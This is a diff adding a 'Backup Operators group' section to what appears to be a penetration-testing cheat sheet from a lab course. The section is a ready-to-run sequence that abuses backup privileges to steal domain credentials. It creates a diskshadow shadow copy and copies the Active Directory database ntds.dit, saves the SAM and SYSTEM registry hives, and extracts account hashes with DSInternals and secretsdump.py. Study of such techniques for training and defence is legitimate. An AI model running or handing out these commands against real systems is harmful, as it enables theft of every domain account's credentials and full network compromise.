@@ -358,4 +358,38 @@ Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname
 icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
 ```
 
+## Backup Operators group
+```
+diskshadow.exe
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+```
+```powershell
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+
+robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+
+reg save HKLM\SYSTEM system
+
+reg save HKLM\SAM sam
+```
+```powershell
+Import-Module .\DSInternals.psd1
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+```
+```bash
+secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+```
+
+
 </details>
